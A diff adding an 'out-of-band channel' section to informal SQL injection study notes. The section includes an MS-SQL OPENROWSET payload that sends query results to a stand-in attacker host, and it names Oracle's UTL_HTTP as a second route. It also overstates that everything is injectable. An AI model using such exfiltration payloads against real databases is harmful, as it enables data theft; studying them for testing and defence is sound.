@@ -112,4 +112,29 @@ The most common types of SQL statements are:
 
 **Note:** Not every attack is about stealing information — some just want to destroy your system/device.
 
-remeber to go further today]]=tomorrow
+## Using an out-of-band channel 
+
+many time the webserver or browser dont let table to show or dont let the server to display stuff when any injection is done or taking place 
+hence we think that the injection didn't worked or the website is not prone to sql injection 
+but in reality everything is prone to injection its just not visibile to u 
+
+so for that we will transfer the table or data to an out of band channel or network where we can see these data directly 
+
+### MS-SQL
+
+use OpenRowSet command can be used to open a connection to an external database and insert arbitary data into it 
+
+
+`insert into openrowset(‘SQLOLEDB’,
+‘DRIVER={SQL Server};SERVER=wahh-attacker.com,80;UID=sa;PWD=letmein’,
+‘select * from foo’) values (@@version)`
+
+note: u can specify port 80 or any port of your wish 
+
+
+### Oracle 
+
+use UTL_HTTP package can be used to make arbitrary HTTP requests to other hosts.
+
+
+
